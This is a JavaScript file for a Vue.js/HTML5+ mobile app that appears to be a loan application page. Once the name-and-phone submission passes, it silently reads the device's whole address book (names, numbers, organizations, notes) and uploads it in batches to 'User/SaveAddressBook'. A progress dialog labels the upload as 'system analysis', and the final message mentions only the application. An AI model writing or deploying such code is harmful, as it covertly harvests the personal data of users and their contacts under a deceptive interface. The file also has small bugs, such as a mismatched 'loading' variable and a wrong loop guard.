var vm = new Vue({
	el: "#vue-app",
	data: {
		txtName: "",
		txtMobile: "",
		loading: null,
		addressBooks: [],
		abLength: 0,
		already:0
	},
	methods: {
		btnApply: function() {
			//提交申请
			if(sui.IsNullOrEmpty(vm.txtName)) {
				mui.toast('请输入姓名');
				return;
			} else if(sui.IsNullOrEmpty(vm.txtMobile)) {
				mui.toast('请输入手机号码');
				return;
			} else if(!vm.txtMobile.isMobile()) {
				mui.toast('请输入正确的手机号');
				return;
			}
			vm.loadding = vm.showWaiting();
			sui.post('Loan/LoanApply', {
				Name: vm.txtName,
				Phone: vm.txtMobile
			}, function(data) {
				if(data) {
					var IsPass = data.IsPass;
					if(IsPass) {
						if(window.plus) {
							vm.addressBook();
						} else {
							document.addEventListener("plusready",vm.addressBook,false);
						}
					} else {
						vm.closeWaiting();
						mui.toast(data.Desc);
					}
				} else {
					vm.closeWaiting();
				}
			});
		},
		addressBook: function() {
			plus.contacts.getAddressBook(plus.contacts.ADDRESSBOOK_PHONE, function(addressbook) {
					addressbook.find(["displayName", "phoneNumbers", "name", "nickname", "note", "organizations"], function(contacts) {
						vm.abLength = contacts.length;
						for(var i = 0, contact; contact = contacts[i++];) {
							var mobileArr = [];
							var orgArr=[];
							for(var m = 0, item; item = contact.phoneNumbers[m++];) {
								mobileArr.push(item.value);
								if(m>5)
									break;
							}
							if(contact.organizations){
								for(var o = 0, model; model = contact.organizations[o++];) {
									orgArr.push((model.type ||"") + (model.name ||"")  + (model.department  ||"") + (model.title ||""));
									if(m>2)
										break;
								}
							}
							var name= contact.displayName;
							if(contact.name && contact.name.formatted){
								name= contact.name.formatted;
							}
							vm.addressBooks.push({
								"PhoneNumbers": mobileArr.join(',').replaceAll('-','').replaceAll(' ','')  || "",
								"Name": name || "",
								"DisplayName": contact.displayName || "",
								"Nickname": contact.nickname || "",
								"Organization":orgArr.join(',').replaceAll('null',''),
								"Remark": contact.note || ""
							});
						}
						vm.uploadContacts();
					}, function() {
						vm.onSuccess();
					}, {
						multiple: true
					});
				},
				function(e) {
					vm.onSuccess();
				});
		},
		showWaiting: function() {
			if(window.plus) {
				return plus.nativeUI.showWaiting("提交中,请稍候...", {
					back: "close"
				});
			} else {
				document.addEventListener("plusready", function() {
					return plus.nativeUI.showWaiting("提交中,请稍候...", {
						back: "close"
					});
				}, false);
			}
		},
		closeWaiting: function() {
			if(this.loadding) {
				this.loadding.close();
				this.loadding = null;
			}
		},
		uploadContacts: function() {
			if(vm.addressBooks.length > 0) {
				var postData = vm.addressBooks.splice(0, 200);
				var persent =parseInt(100 * vm.already /vm.abLength);
				persent=persent>100?100:persent;
				vm.loadding.setTitle('系统正在进行分析：\n'+persent+'%');
				sui.post('User/SaveAddressBook', postData, function(data) {
					vm.already+=postData.length;
					if(data) {
						 vm.uploadContacts();
					}else{
						vm.onSuccess();
					}
				});
			}else{
				vm.onSuccess();
			}
		},
		onSuccess:function(){
			vm.closeWaiting();
			mui.toast('您的申请已提交成功，我们会尽快与您联系');
			plus.webview.currentWebview().close();
		}
	}
});